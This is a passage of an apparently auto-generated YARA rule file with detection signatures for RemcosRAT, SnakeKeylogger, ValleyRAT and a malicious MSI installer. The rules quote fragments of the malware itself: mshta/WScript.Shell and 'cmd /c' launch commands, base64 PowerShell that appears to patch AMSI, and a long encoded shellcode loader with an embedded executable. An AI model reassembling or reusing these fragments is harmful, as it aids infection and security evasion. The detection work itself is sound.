      $x7 = "ript:CreateObject(\"WScript.Shell\").Run(\"cmd /c if exist \"\"[INSTALLDIR]av.dat\"\" copy /Y \"\"[INSTALLDIR]av.dat\"\" \"\"[Lo" ascii /* score: '33.00'*/
      $x8 = "eam. The binary icon data in PE (.DLL or .EXE) or icon (.ICO) format.InstallExecuteSequenceInstallUISequenceMediaDiskIdPrimary k" ascii /* score: '33.00'*/
      $x9 = "cruntime140.dll14.32.31326.0VCRunTime1srm5ihny.dll|vcruntime140_1.dllInstallerIconFindRelatedProductsValidateProductIDProcessCom" ascii /* score: '33.00'*/
      $x10 = "on.AdminUISequenceAdvtExecuteSequenceComponentPrimary key used to identify a particular component record.ComponentIdGuidA string" ascii /* score: '31.00'*/
      $x11 = "ultFeatureabut2otu.exe|ManualFinderApp.exe2.0.196.01033WebView2qbz-rkcp.dll|WebView2Loader.dll1.0.3351.48VCRunTimeogx91y4r.dll|v" ascii /* score: '31.00'*/
      $x12 = "eateObject(\"WScript.Shell\").Run(\"\"\"[INSTALLDIR]ManualFinderApp.exe\"\" /bg\",0,false)(window.close)KillAppProcessSystemFold" ascii /* score: '31.00'*/
      $s13 = "der]av.dat\"\"\",0,true)(window.close)BackupFile3mshta vbscript:CreateObject(\"WScript.Shell\").Run(\"cmd /c if exist \"\"[INSTA" ascii /* score: '30.00'*/
      $s14 = "close)SetInstallParentLocalAppDataFolder[LocalAppDataFolder]BackupFile1mshta vbscript:CreateObject(\"WScript.Shell\").Run(\"cmd " ascii /* score: '29.00'*/
      $s15 = "vbscript:CreateObject(\"WScript.Shell\").Run(\"taskkill /F /IM ManualFinderApp.exe\",0,true)(window.close)RunAppWithAvunMainEXE/" ascii /* score: '27.00'*/
   condition:
      uint16(0) == 0xcfd0 and filesize < 9000KB and
      1 of ($x*) and all of them
}

rule RemcosRAT_signature__a67bbf80 {
   meta:
      description = "_subset_batch - file RemcosRAT(signature)_a67bbf80.js"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "a67bbf80bdf9f555d4342716a9f240526f8e6bde9674bd0574c5a1bc8bd61f12"
   strings:
      $s1 = "61,50,55,56,58,62,61,50,55,56,58,62,62,50,63,61,62,63,50,63,62,63,54,50,55,54,55,59,63,50,63,62,63,55,50,55,54,54,59,57,50,55,54" ascii /* score: '9.00'*/ /* hex encoded string 'aPUVXbaPUVXbbPcabcPcbcTPUTUYcPcbcUPUTTYWPUT' */
      $s2 = "55,54,55,60,62,50,55,54,55,60,55,50,62,62,60,55,50,55,54,54,59,63,50,63,62,61,59,50,62,62,54,62,50,55,54,54,59,54,50,63,61,62,62" ascii /* score: '9.00'*/ /* hex encoded string 'UTU`bPUTU`UPbb`UPUTTYcPcbaYPbbTbPUTTYTPcabb' */
      $s3 = "56,50,63,62,61,63,50,55,54,55,59,58,50,63,62,62,63,50,63,62,57,57,50,62,61,59,57,50,55,54,54,57,59,50,63,60,61,59,50,55,54,55,61" ascii /* score: '9.00'*/ /* hex encoded string 'VPcbacPUTUYXPcbbcPcbWWPbaYWPUTTWYPc`aYPUTUa' */
      $s4 = "61,58,59,50,63,62,61,62,50,55,62,54,50,55,54,55,60,59,50,62,62,60,56,50,63,62,63,56,50,63,62,57,56,50,63,62,63,63,50,55,54,54,62" ascii /* score: '9.00'*/ /* hex encoded string 'aXYPcbabPUbTPUTU`YPbb`VPcbcVPcbWVPcbccPUTTb' */
      $s5 = "58,50,55,54,54,57,56,50,55,54,54,59,54,50,55,62,54,50,55,57,50,59,54,50,59,54,50,57,59,50,63,60,63,59,50,63,61,60,55,50,55,54,54" ascii /* score: '9.00'*/ /* hex encoded string 'XPUTTWVPUTTYTPUbTPUWPYTPYTPWYPc`cYPca`UPUTT' */
      $s6 = "55,60,55,50,63,60,61,59,50,63,60,59,57,50,55,54,55,59,61,50,55,54,54,59,56,50,55,57,50,59,54,50,59,54,50,57,59,50,63,60,59,58,50" ascii /* score: '9.00'*/ /* hex encoded string 'U`UPc`aYPc`YWPUTUYaPUTTYVPUWPYTPYTPWYPc`YXP' */
      $s7 = "62,63,58,50,63,61,57,56,50,63,61,57,57,50,63,62,63,60,50,63,61,59,61,50,63,62,57,61,50,55,54,55,59,60,50,55,54,54,57,60,50,55,54" ascii /* score: '9.00'*/ /* hex encoded string 'bcXPcaWVPcaWWPcbc`PcaYaPcbWaPUTUY`PUTTW`PUT' */
      $s8 = "50,55,54,54,56,63,50,55,56,58,61,58,50,55,54,54,60,55,50,55,54,54,58,55,50,62,59,63,63,50,55,54,55,60,54,50,63,60,63,58,50,55,56" ascii /* score: '9.00'*/ /* hex encoded string 'PUTTVcPUVXaXPUTT`UPUTTXUPbYccPUTU`TPc`cXPUV' */
      $s9 = "57,60,50,55,54,55,59,57,50,62,60,54,57,50,63,63,54,57,50,55,57,50,59,54,50,59,54,50,57,59,50,55,54,54,58,57,50,55,54,54,59,63,50" ascii /* score: '9.00'*/ /* hex encoded string 'W`PUTUYWPb`TWPccTWPUWPYTPYTPWYPUTTXWPUTTYcP' */
      $s10 = "55,54,54,59,58,50,62,61,57,61,50,62,61,60,54,50,55,54,54,57,57,50,55,56,58,63,59,50,62,59,63,63,50,55,54,55,61,56,50,55,54,55,59" ascii /* score: '9.00'*/ /* hex encoded string 'UTTYXPbaWaPba`TPUTTWWPUVXcYPbYccPUTUaVPUTUY' */
      $s11 = "63,61,59,61,50,63,61,59,63,50,62,59,63,63,50,63,61,57,55,50,62,62,59,60,50,63,61,54,54,50,63,62,57,57,50,55,54,55,59,63,50,62,61" ascii /* score: '9.00'*/ /* hex encoded string 'caYaPcaYcPbYccPcaWUPbbY`PcaTTPcbWWPUTUYcPba' */
      $s12 = "50,63,62,62,55,50,63,62,61,59,50,63,62,57,61,50,63,61,57,55,50,63,57,58,50,63,62,62,60,50,55,54,54,58,61,50,55,54,54,59,55,50,55" ascii /* score: '9.00'*/ /* hex encoded string 'PcbbUPcbaYPcbWaPcaWUPcWXPcbb`PUTTXaPUTTYUPU' */
      $s13 = "60,63,57,50,63,61,58,59,50,55,57,50,59,54,50,59,54,50,57,59,50,55,54,54,59,54,50,55,54,54,57,59,50,55,56,58,63,59,50,55,54,54,57" ascii /* score: '9.00'*/ /* hex encoded string '`cWPcaXYPUWPYTPYTPWYPUTTYTPUTTWYPUVXcYPUTTW' */
      $s14 = "62,61,58,61,50,55,54,55,59,58,50,63,60,60,57,50,63,61,62,62,50,63,60,61,62,50,62,61,57,58,50,55,62,58,50,63,60,63,58,50,63,60,61" ascii /* score: '9.00'*/ /* hex encoded string 'baXaPUTUYXPc``WPcabbPc`abPbaWXPUbXPc`cXPc`a' */
      $s15 = "60,50,55,61,56,50,63,60,62,56,50,55,54,54,59,60,50,63,61,62,63,50,55,54,55,61,55,50,55,54,54,58,60,50,62,61,57,57,50,63,62,63,54" ascii /* score: '9.00'*/ /* hex encoded string '`PUaVPc`bVPUTTY`PcabcPUTUaUPUTTX`PbaWWPcbcT' */
   condition:
      uint16(0) == 0x2f2f and filesize < 7000KB and
      8 of them
}

rule SnakeKeylogger_signature__2 {
   meta:
      description = "_subset_batch - file SnakeKeylogger(signature).js"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "7c15d5c57a85cbb55dec53514a8b0ce1e055bc5f49fb9feb2fa307d6a43f36c5"
   strings:
      $x1 = "SpectrumController.WriteLine(\":: 4mU8R71CBWLkgbjl9Ox9q6Cx2IQQ3q9PPabhAK8kpqy0lKxFrxQ29SH2aWqg8qHFhagiDgooh3iQhvD0HdjdGPTrNHTOzN" ascii /* score: '44.00'*/
      $s2 = "GetObject(ArtificialDaemon).Get(MatrixServer).Create('cmd /c ' + VectorHub, null, null, null);" fullword ascii /* score: '29.00'*/
      $s3 = "var VectorHub = HolographicParser + '\\\\VirtualProcess.bat';" fullword ascii /* score: '26.00'*/
      $s4 = "SpectrumController.WriteLine(\"!sneejvlcmprphep! \\\"%iztegnxrb%i%iztegnxrb%p%iztegnxrb%h%iztegnxrb%g%iztegnxrb%v%iztegnxrb%t%iz" ascii /* score: '22.00'*/
      $s5 = "AQAAoADYAOQAsADEAMQA2ACwAMQAxADkALAA2ADkALAAxADEAOAAsADEAMAAxACwAMQAxADAALAAxADEANgAsADgANwAsADEAMQA0ACwAMQAwADUALAAxADEANgAsADE" ascii /* base64 encoded string '@ ( 6 9 , 1 1 6 , 1 1 9 , 6 9 , 1 1 8 , 1 0 1 , 1 1 0 , 1 1 6 , 8 7 , 1 1 4 , 1 0 5 , 1 1 6 , 1' */ /* score: '21.00'*/
      $s6 = "AKAA3ADEALAAxADAAMQAsADEAMQA2ACwAOAAwACwAMQAxADQALAAxADEAMQAsADkAOQAsADYANQAsADEAMAAwACwAMQAwADAALAAxADEANAAsADEAMAAxACwAMQAxADU" ascii /* base64 encoded string '( 7 1 , 1 0 1 , 1 1 6 , 8 0 , 1 1 4 , 1 1 1 , 9 9 , 6 5 , 1 0 0 , 1 0 0 , 1 1 4 , 1 0 1 , 1 1 5' */ /* score: '21.00'*/
      $s7 = "AIAAiAEUAeABlAGMAdQB0AGkAbwBuAEMAbwBuAHQAZQB4AHQAIgAgAC0AVgBhAGwAdQBlAE8AbgBsAHkAIAAtAEUAcgByAG8AcgBBAGMAdABpAG8AbgAgAFMAaQBsAGU" ascii /* base64 encoded string '  " E x e c u t i o n C o n t e x t "   - V a l u e O n l y   - E r r o r A c t i o n   S i l e' */ /* score: '21.00'*/
      $s8 = "AdAB5AFMAZQByAHYAaQBjAGUAIAAkAHMAdwBlAGUAdABUAGEAcgBnAGUAdABTAGUAYwB1AHIAaQB0AHkATQBvAGQAdQBsAGUAIAAkAGIAZQByAHIAeQBJAG4AaQB0AGk" ascii /* base64 encoded string 't y S e r v i c e   $ s w e e t T a r g e t S e c u r i t y M o d u l e   $ b e r r y I n i t i' */ /* score: '21.00'*/
      $s9 = "AdABpAG8AbgAgAD0AIAAkAGIAZQByAHIAeQBBAHUAdABvAG0AYQB0AGkAbwBuAFUAdABpAGwAaQB0AGkAZQBzAC4ARwBlAHQATQBlAHQAaABvAGQAKAAnAFMAYwBhAG4" ascii /* base64 encoded string 't i o n   =   $ b e r r y A u t o m a t i o n U t i l i t i e s . G e t M e t h o d ( ' S c a n' */ /* score: '21.00'*/
      $s10 = "AZQAoAFsASQBuAHQAUAB0AHIAXQA6ADoAQQBkAGQAKAAkAHMAdwBlAGUAdABUAHIAYQBjAGkAbgBnAEEAZABkAHIAZQBzAHMALAAgACQAcwB3AGUAZQB0AFAAYQB0AGM" ascii /* base64 encoded string 'e ( [ I n t P t r ] : : A d d ( $ s w e e t T r a c i n g A d d r e s s ,   $ s w e e t P a t c' */ /* score: '21.00'*/
      $s11 = "AQgB1AGkAbABkAGUAcgAuAFMAZQB0AEkAbQBwAGwAZQBtAGUAbgB0AGEAdABpAG8AbgBGAGwAYQBnAHMAKABbAFMAeQBzAHQAZQBtAC4AUgBlAGYAbABlAGMAdABpAG8" ascii /* base64 encoded string 'B u i l d e r . S e t I m p l e m e n t a t i o n F l a g s ( [ S y s t e m . R e f l e c t i o' */ /* score: '21.00'*/
      $s12 = "AZQB0AEkAbQBwAGwAZQBtAGUAbgB0AGEAdABpAG8AbgBGAGwAYQBnAHMAKABbAFMAeQBzAHQAZQBtAC4AUgBlAGYAbABlAGMAdABpAG8AbgAuAE0AZQB0AGgAbwBkAEk" ascii /* base64 encoded string 'e t I m p l e m e n t a t i o n F l a g s ( [ S y s t e m . R e f l e c t i o n . M e t h o d I' */ /* score: '21.00'*/
      $s13 = "AcgByAHkAUAByAG8AYwBlAGQAdQByAGUAQQBkAGQAcgBlAHMAcwAgAEAAKABbAHMAdAByAGkAbgBnAF0ALABbAFUASQBuAHQANgA0AF0ALgBNAGEAawBlAEIAeQBSAGU" ascii /* base64 encoded string 'r r y P r o c e d u r e A d d r e s s   @ ( [ s t r i n g ] , [ U I n t 6 4 ] . M a k e B y R e' */ /* score: '21.00'*/
      $s14 = "AdAByAGEAdwBiAGUAcgByAHkATQBlAG0AbwByAHkATQBhAG4AYQBnAGUAcgA6ADoAVwByAGkAdABlAEIAeQB0AGUAKABbAEkAbgB0AFAAdAByAF0AOgA6AEEAZABkACg" ascii /* base64 encoded string 't r a w b e r r y M e m o r y M a n a g e r : : W r i t e B y t e ( [ I n t P t r ] : : A d d (' */ /* score: '21.00'*/
      $s15 = "AZgAgACgAJABiAGUAcgByAHkATgBlAHgAdABQAHIAbwB2AGkAZABlAHIAIAAtAGUAcQAgADAAIAAtAG8AcgAgACQAYgBlAHIAcgB5AE4AZQB4AHQAUAByAG8AdgBpAGQ" ascii /* base64 encoded string 'f   ( $ b e r r y N e x t P r o v i d e r   - e q   0   - o r   $ b e r r y N e x t P r o v i d' */ /* score: '21.00'*/
   condition:
      uint16(0) == 0x6176 and filesize < 600KB and
      1 of ($x*) and 4 of them
}

rule ValleyRAT_signature__2829d152746bf5bd2dd080db2afd5e84_imphash_ {
   meta:
      description = "_subset_batch - file ValleyRAT(signature)_2829d152746bf5bd2dd080db2afd5e84(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "32707782f013eb238698096cb310efc3fdde8a6765a495037de479d93de4a88b"
   strings:
      $s1 = "NDg4MUVDQzgwMjAwMDA0OEM3ODQyNDY4MDEwMDAwMDAwMDAwMDA0OEM3ODQyNDAwMDEwMDAwMDAwMDAwMDA0OEM3ODQyNEEwMDIwMDAwMDAwMDAwMDA0OEM3ODQyNDYw" ascii /* base64 encoded string '4881ECC802000048C78424680100000000000048C78424000100000000000048C78424A00200000000000048C78424600100000000000065488B0425600000004889842478020000488B842478020000488B40184889842480020000488B842480020000488B402048898424D0010000488B8424D0010000488B405048898424A8020000488B8424D0010000488B0048898424D8010000488B8424D8010000488B405048898424B0020000488B8424D8010000488B0048898424E0010000488B8424E0010000488B405048898424B8020000488B8424E0010000488B40204889842490000000488B8424900000004889842488020000488B8424880200004863403C488B8C24900000004803C8488BC148898424E8010000488B8424E80100004805880000004889842438010000B808000000486BC000488B8C24380100004803C8488BC14889842438010000488B8424380100008B00488B8C24900000004803C8488BC148898424D8000000488B8424D80000008B400C89842408020000488B8424D80000008B401489842490010000488B8424D80000008B401889842494010000488B8424D80000008B401C488B8C24900000004803C8488BC14889842440010000488B8424D80000008B4020488B8C24900000004803C8488BC148898424F8010000488B8424D80000008B4024488B8C24900000004803C8488BC148898424F0010000C644245857C644245975C644245A84C644245B60C644245C82C644245D7FC644245E73C644245F51C644246074C644246174C644246282C644246375C644246483C644246583C644246600C744247000000000EB0A8B442470FFC08944247048634424704883F80E731848634424700FB644045883E81048634C247088440C58EBD3C64424305CC64424317FC644243271C644243374C64424345CC644243579C644243672C644243782C644243871C644243982C644243A89C644243B51C644243C00C744247400000000EB0A8B442474FFC08944247448634424744883F80C731848634424740FB644043083E81048634C247488440C30EBD3C644244066C644244179C644244282C644244384C644244485C644244571C64424467CC644244751C64424487CC64424497CC644244A7FC644244B73C644244C00C744247800000000EB0A8B442478FFC08944247848634424784883F80C731848634424780FB644044083E81048634C247888440C40EBD3C744246801000000EB0A8B442468FFC0894424688B842490010000394424680F87C3050000C744247C00000000EB0A8B44247CFFC08944247C8B8424940100003944247C0F83990500008B44247C488B8C24F00100000FB704413B4424680F857A0500008B44247C488B8C24F80100008B0481898424980100008B842498010000488B8C24900000004803C8488BC14889442420488B4424200FBE00B901000000486BC9000FB64C0C583BC10F85BA010000488B4424200FBE4001B901000000486BC9010FB64C0C583BC10F859B010000488B4424200FBE4002B901000000486BC9020FB64C0C583BC10F857C010000488B4424200FBE4003B901000000486BC9030FB64C0C583BC10F855D010000488B4424200FBE4004B901000000486BC9040FB64C0C583BC10F853E010000488B4424200FBE4005B901000000486BC9050FB64C0C583BC10F851F010000488B4424200FBE4006B901000000486BC9060FB64C0C583BC10F8500010000488B4424200FBE4007B901000000486BC9070FB64C0C583BC10F85E1000000488B4424200FBE4008B901000000486BC9080FB64C0C583BC10F85C2000000488B4424200FBE4009B901000000486BC9090FB64C0C583BC10F85A3000000488B4424200FBE400AB901000000486BC90A0FB64C0C583BC10F8584000000488B4424200FBE400BB901000000486BC90B0FB64C0C583BC17569488B4424200FBE400CB901000000486BC90C0FB64C0C583BC1754E488B4424200FBE400DB901000000486BC90D0FB64C0C583BC175338B442468488B8C24400100008B0481898424180100008B842418010000488B8C24900000004803C8488BC14889842468010000488B4424200FBE00B901000000486BC9000FB64C0C303BC10F859B010000488B4424200FBE4001B901000000486BC9010FB64C0C303BC10F857C010000488B4424200FBE4002B901000000486BC9020FB64C0C303BC10F855D010000488B4424200FBE4003B901000000486BC9030FB64C0C303BC10F853E010000488B4424200FBE4004B901000000486BC9040FB64C0C303BC10F851F010000488B4424200FBE4005B901000000486BC9050FB64C0C303BC10F8500010000488B4424200FBE4006B901000000486BC9060FB64C0C303BC10F85E1000000488B4424200FBE4007B901000000486BC9070FB64C0C303BC10F85C2000000488B4424200FBE4008B901000000486BC9080FB64C0C303BC10F85A3000000488B4424200FBE4009B901000000486BC9090FB64C0C303BC10F8584000000488B4424200FBE400AB901000000486BC90A0FB64C0C303BC17569488B4424200FBE400BB901000000486BC90B0FB64C0C303BC1754E488B4424200FBE400CB901000000486BC90C0FB64C0C303BC175338B442468488B8C24400100008B04818984241C0100008B84241C010000488B8C24900000004803C8488BC14889842460010000488B4424200FBE00B901000000486BC9000FB64C0C403BC10F859B010000488B4424200FBE4001B901000000486BC9010FB64C0C403BC10F857C010000488B4424200FBE4002B901000000486BC9020FB64C0C403BC10F855D010000488B4424200FBE4003B901000000486BC9030FB64C0C403BC10F853E010000488B4424200FBE4004B901000000486BC9040FB64C0C403BC10F851F010000488B4424200FBE4005B901000000486BC9050FB64C0C403BC10F8500010000488B4424200FBE4006B901000000486BC9060FB64C0C403BC10F85E1000000488B4424200FBE4007B901000000486BC9070FB64C0C403BC10F85C2000000488B4424200FBE4008B901000000486BC9080FB64C0C403BC10F85A3000000488B4424200FBE4009B901000000486BC9090FB64C0C403BC10F8584000000488B4424200FBE400AB901000000486BC90A0FB64C0C403BC17569488B4424200FBE400BB901000000486BC90B0FB64C0C403BC1754E488B4424200FBE400CB901000000486BC90C0FB64C0C403BC175338B442468488B8C24400100008B0481898424200100008B842420010000488B8C24900000004803C8488BC14889842400010000E94CFAFFFFE922FAFFFFC68424A0000000E8C68424A100000000C68424A200000000C68424A300000000C68424A400000000C68424A500000058C68424A600000058C68424A700000050C68424A8000000C3C784242801000000100000C784242401000000200000C784242C010000400000008B8424240100008B8C24280100000BC88BC1448B8C242C010000448BC0BA0900000033C9FF94240001000048898424A0010000C784248000000000000000EB108B842480000000FFC08984248000000083BC2480000000097D25486384248000000048638C2480000000488B9424A00100000FB68404A000000088040AEBC1FF9424A001000048898424B800000048C78424F000000000000000C744242800000000EB0A8B442428FFC089442428817C242800409C000F8DAF0000004863442428488B8C24B80000000FB6040183F84D0F85900000004863442428488B8C24B80000000FB644010183F85A75794863442428488B8C24B80000000FB64401023D9000000075604863442428488B8C24B80000000FB644010385C0754A4863442428488B8C24B80000000FB644010483F80375334863442428488B8C24B80000000FB644010585C0751D4863442428488B8C24B80000004803C8488BC148898424F0000000EB05E939FFFFFF48C784248001000000000000488B8424F000000048898424A8010000488B8424A80100008B403C898424300100004863842430010000488B8C24F00000004803C8488BC14889842498000000488B842498000000488B4030488984248001000048C744245000000000488B8424980000008B405041B94000000041B8003000008BD0488B8C2480010000FF9424000100004889442450C78424E00000000000000048837C2450007532488B8424980000008B405041B94000000041B8003000008BD033C9FF9424000100004889442450C78424E000000001000000488B842498000000488B4C245048894830C784248400000000000000EB108B842484000000FFC089842484000000488B8424980000008B4054398424840000007327486384248400000048638C2484000000488B5424504C8B8424F0000000410FB6040088040AEBB5488B8424980000004805080100004889842448010000C744246C00000000EB0A8B44246CFFC08944246C488B8424980000000FB740063944246C0F8DA1000000C784248800000000000000EB108B842488000000FFC089842488000000486344246C486BC028488B8C24480100008B440110398424880000007361486344246C486BC028488B8C24480100008B440114488B8C24F00000004803C8488BC148638C2488000000486354246C486BD2284C8B842448010000418B54100C4C8B4424504C03C2498BD04C638424880000000FB6040842880402E971FFFFFFE93FFFFFFF488B4424504889842400020000488B8424A80100008B403C898424340100004863842434010000488B8C24000200004803C8488BC1488984246002000048C784245001000000000000488B84246002000048898424B8010000B808000000486BC001488B8C24B8010000488D8401880000004889842450010000488B8424500100008B40044889842410020000488B8424500100008B00488984241802000048C78424C00000000000000048C784240801000000000000EB14488B8424080100004883C0144889842408010000488B84241002000048398424080100000F8365020000488B842408010000488B8C24180200004803C8488BC1480344245048898424C0000000488B8424C00000008338007513488B8424C0000000837810007505E922020000488B8424C00000008B400C488B4C24504803C8488BC148898424B0010000488B8424C00000008B40104889842420020000488B8424C00000008B0048898424580100004883BC2458010000007513488B8424C00000008B4010488984245801000048C78424700100000000000048C78424780100000000000033C083F8010F8499010000488B842470010000488B4C24504803C8488BC148038424200200004889842410010000488B842478010000488B4C24504803C8488BC1480384245801000048898424F8000000488B8424F8000000B900000080488B004823C14885C0751D488B8424F800000048B90000000000000080488B004823C14885C07458488B8424F8000000488B004825FFFF00004889842428020000488B8C24B0010000FF942460010000488B8C2428020000488BD1488BC8FF9424680100004889842430020000488B842410010000488B8C2430020000488908488B842410010000488338007505E9B3000000488B842410010000488B8C24F8000000488B09483908756E488B8424F8000000488B00488B4C24504803C8488BC14889842438020000488B8424380200004883C0024889842440020000488B8C24B0010000FF942460010000488B942440020000488BC8FF9424680100004889842448020000488B842410010000488B8C2448020000488908488B8424700100004883C0084889842470010000488B8424780100004883C0084889842478010000E95CFEFFFFE971FDFFFF83BC24E0000000000F840D020000488B8424800100004889842450020000488B4424504889842458020000488B842450020000488B8C2458020000482BC8488BC14889842468020000B808000000486BC005488B8C24B8010000488D84018800000048898424C0010000488B8424C00100008B40044889842498020000488B8424C00100008B004889842490020000488B842490020000488B4C24504803C8488BC148898424C8000000488B8424C80000008B400483E808898424E8000000488B8424C80000004883C00848898424D0000000488B8424D00000004889842488010000C78424E40000000000000033C083F8010F84220100008B8424E4000000FFC0898424E4000000C78424B000000000000000EB118B8424B000000083C002898424B00000008B8424E8000000398424B00000000F8D83000000488B8424D00000004889842488010000B8FF0F0000488B8C24880100000FB7096623C80FB7C10FB7C0488B8C24C80000008B0903C88BC18BC0488B4C24504803C8488BC148898424C8010000488B8424C8010000488B004803842468020000488B8C24C8010000488901488B8424D00000004883C00248898424D0000000E958FFFFFF488B8424D000000048898424C8000000488B8424C80000008338007502EB3E488B8424C80000004883C00848898424D0000000488B8424C80000008B400483E808898424E8000000488B8424D00000004889842488010000E9D3FEFFFF488B8424980000008B4028488B4C24504803C8488BC14889842470020000FF9424700200004881C4C8020000C34D5A90000300000004000000FFFF0000B800000000000000400000000000000000000000000000000000000000000000000000000000000000000000E80000000E1FBA0E00B409CD21B8014CCD21546869732070726F6772616D2063616E6E6F742062652072756E20696E20444F53206D6F64652E0D0D0A240000000000000002E0095646816705468167054681670529F7CD052B81670529F7F9054D81670529F7CC056B8167054FF9F4054D81670546816605C881670529F7C8054B81670529F7FA054781670552696368468167050000000000000000000000000000000000000000000000005045000064860600661EB7660000000000000000F00022000B020A0000680100009E000000000000749A00000010000000000040010000000010000000020000050002000000000005000200000000000090020000040000545502000200408100001000000000000010000000000000000010000000000000100000000000000000000010000000000000000000000028D001007800000000700200B40100000050020078150000000000000000000000800200F802000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000800100380400000000000000000000000000000000000000000000000000002E7465787400000006660100001000000068010000040000000000000000000000000000200000602E726461746100003A5D000000800100005E0000006C0100000000000000000000000000400000402E646174610000007067000000E001000022000000CA0100000000000000000000000000400000C02E7064617461000078150000005002000016000000EC0100000000000000000000000000400000402E72737263000000B4010000007002000002000000020200000000000000000000000000400000402E72656C6F630000BE0500000080020000060000000402000000000000000000000000004000004200000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000048895C2408574883EC20488D0597980100488BD98BFA488901488B49084885C9740E33D241B800800000FF15A071010040F6C7017408488BCBE8767A0000488BC3488B5C24304883C4205FC3CCCCCCCC4883EC28488D054D980100488901488B49084885C9740E33D241B800800000FF155B7101004883C428C3CCCCCCCCCCCC4053565741574883EC284C896C24604533FF4C89742420458BE9418BF84C8BF2488BD94C3979087505418BC7EB068B41102B41088D0C3848896C24503B4B180F8288000000660FEFC08BC14C89642458F2480F2AC0F20F5905739B0100E89207010033C941B800100000448D4904F2480F2CE8C1E50A8BD5FF15C2700100488B5308488BF04885D27505418BCFEB058B4B102BCA448BE1448BC1488BC8E8DE790000488B4B084885C9740E33D241B800800000FF1597700100498D04344C8B6424584889730848894310896B18488B4B104C8BC7498BD6E8A47900004C8B7424204585ED4C8B6C24607465458BD74D8BCF4D8BDF85FF7E58488B6C24700F1F00410FB60C294C8B431049FFC1B8EF23B88FF7E903D1C1FA088BC2C1E81F03D0B8CDCCCCCC69D2C80100002BCA41F7E280C13643300C03C1EA038D0C9203C9443BD14D0F44CF41FFC249FFC3443BD77CB048017B10488B6C24508BC74883C428415F5F5E5BC3CCCCCCCCCCCCCCCCCCCCCC40574883EC204883790800488BF974128B41102B41083BD0730833C04883C4205FC3660FEFC08BC24889742440F2480F2AC0F20F5905269A0100E845060100F2480F2CF0C1E60A3B7718730D33C0488B7424404883C4205FC333C98BD641B800100000448D490448895C243048896C2438FF15596F0100488B5708488BE84885D2750433C0EB058B47102BC2448BC0488BCD8BD8E877780000488B4F0833D241B800800000FF15356F0100488D0C2B488B5C243048896F08488B6C24388977188BC6488B74244048894F104883C4205FC3CCCCCCCCCCCCCCCCCCCCCCCCCCCCCC4883EC28894C2430488D1541BC0100488D4C2430E89F870000CCCCCCCCCCCCCC48FF25516D0100CCCCCCCCCCCCCCCCCC488D0569720100488901E9A97C0000CC48895C2408574883EC20488D054F7201008BDA488BF9488901E88A7C0000F6C3017408488BCFE879770000488BC7488B5C24304883C4205FC3CCCCCCCCCCCCCC40534883EC20833900488BD97E5048897C243033FF4C8B43084C3B4310740E498B40084889430848897810EB0D4D85C0742748897B0848897B104D85C0741A4989780849897810FF0B498B0833D2488B09FF15096E0100EBBC488B7C24304883C4205BC3CCCCCCCCCCCCCCCCCCCCCCCC4889742410574883EC20418BF8448B4120488BF144034118442B4130443BC7410F4CF885FF7E1D488B493048895C24304863DF4C8BC3E80577000048015E30488B5C24308BC7488B7424384883C4205FC3CCCCCCCCCCCCCCCCCCCCCCCCCCCCCC488B0948FF25BE6C0100CCCCCCCCCCCC4889742410574883EC2033F6488BF9483971387462448B81B80000008B4178412BC085C07E5166660F1F84000000000033D2418BC0F777308BCA488B57384C8B0CCA4983F90F760F498BC1F0480FB134CA0F849A000000418D4801418BC0F00FB18FB8000000448B87B80000008B4778412BC085C07FB9488B0F48895C24308B5F208D433833D24C63C0FF15F86C01004C8BC84883C03841895918488B5C24304989394989710849897110498941204989412849894130458B4118498B5120498BC14585C0418BC80F4FCE4863C94803CA4585C0440F4FC6488B742438498949284963C84803CA498949304883C4205FC3418D4801418BC0F00FB18FB8000000EBB5CCCCCCCCCCCCCCCCCCCCCCCCCCCC48895C242041544883EC204533E44889742438488BD9418BF4443921764648896C243048897C2440418BFC0F1F440000488B6B084C8B042F4983F80F7612498B0833D2488B09FF15246C01004C89242FFFC64883C7083B3372D6488B7C2440488B6C2430488B4B08488B7424384885C97417E8797A00004C896308448923448963484489A388000000488B5C24484883C420415CC3CCCCCCCCCCCCCCCCCCCCCC40574883790800488BFA4C8BC1750433C05FC348895C241033DB448BD339197666458B4848418B8088000000458B18418BC92BC8413BCB7D4E33D2418BC141F7F38BCA498B500848391CCA750A33C0F0480FB13CCA741E418D4901418BC1F0410FB1484841FFC2453B1072B58BC3488B5C24105FC3418D4901418BC1F0410FB14848BB010000008BC3488B5C24105FC340534883EC20488BD9E8867900004C8D1DEB6E01004C891B488BC34883C4205BC3CCCCCCCCCCCCCCCCCCCCCCCCCCCCCC4C894424184C894C2420534881EC30040000488B051FCB01004833C44889842420040000498BC0488BD98591F800000074344883B90801000000742A4C8D842458040000488D4C2420488BD0E8D37B00004C8B83D8000000488D4C2420488BD3FF9308010000488B8C24200400004833CCE8BA7300004881C4300400005BC3CC8591F800000074104883B908010000007406B801000000C333C0C3CCCCCCCCCC48895C24084889742410574883EC20F681F800000001418BF8488BF2488BD9741E4883B908010000007414458BC84C8D0553910100BA01000000E821FFFFFF85FF751233C0488B5C2430488B7424384883C4205FC34C8B8BD80000004C8BC38BD7488BCE488B8300010000488B5C2430488B7424384883C4205F48FFE0CCCCCC48895C240848896C24104889742418574883EC20488B3D150002008BE9488BF2B9100100004885FF740BFFD7488B3DFDFF0100EB05E876780000488BD84885C00F84890000004889B0D800000033F68928C7403820000000C7403C8000000048C740408000000048897010488970188970204889707489B08000000089704889B0F4000000C7400478050000C7400860050000B9B01000004885FF7404FFD7EB05E80A780000488983E00000004885C07524488B057FFF0100488BCB4885C07409FFD033C0E9C7000000E8A177000033C0E9BB000000488D83880000004889735C4889736448890048898390000000488D8398000000488900488983A0000000488D83A8000000488900488983B0000000488D83B8000000488900488983C000000089730C488BC34889B3C80000004889B3D000000048897328C74330C8000000C743346400000089734CC74350640000004889736C89B3F8000000C743240200000089B3E800000048C783EC0000000500000048C7435464000000C7437C140000004889B3000100004889B308010000488B5C2430488B6C2438488B7424404883C4205FC3CCCCCCC